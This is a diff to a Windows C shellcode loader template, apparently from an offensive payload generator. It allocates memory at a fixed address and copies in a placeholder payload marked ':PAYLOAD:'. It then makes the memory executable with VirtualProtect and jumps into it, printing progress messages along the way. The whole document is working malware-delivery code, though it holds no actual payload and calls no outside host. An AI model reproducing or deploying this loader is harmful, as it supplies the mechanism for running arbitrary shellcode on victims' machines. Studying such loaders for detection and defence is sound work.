@@ -1,23 +1,29 @@
 #include <stdio.h>
 #include <windows.h>
 
-unsigned char payload[]	 = ":PAYLOAD:";
-unsigned int payload_len = sizeof(payload);
+unsigned char PAYLOAD[]	 = ":PAYLOAD:";
+unsigned int PAYLOAD_LEN = sizeof(PAYLOAD);
+
+LPVOID PAYLOAD_ADDR = (LPVOID) 0xaffff000;
 
 void (*entry)();
 
 int main(void) {
-	void *shellcode;
 	BOOL rv;
 	HANDLE th;
 	DWORD oldprotect = 0;
 
-	// Shellcode
-	shellcode = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	RtlMoveMemory(shellcode, payload, payload_len);
-	rv = VirtualProtect(shellcode, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+	void* shellcode = VirtualAlloc(PAYLOAD_ADDR, PAYLOAD_LEN, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	
+	printf("[+] Memory allocated: 0x%lp\n", shellcode);
 
-	printf("[+] Execute: %p\n", shellcode);
+	RtlMoveMemory(shellcode, PAYLOAD, PAYLOAD_LEN);
+	
+	rv = VirtualProtect(shellcode, PAYLOAD_LEN, PAGE_EXECUTE_READ, &oldprotect);
+
+	printf("[+] Permission changed (RX)\n");
+
+	printf("[+] Jumping to shellcode: 0x%lp\n", shellcode);
 
 	entry = (void (*)()) shellcode;
 	entry();
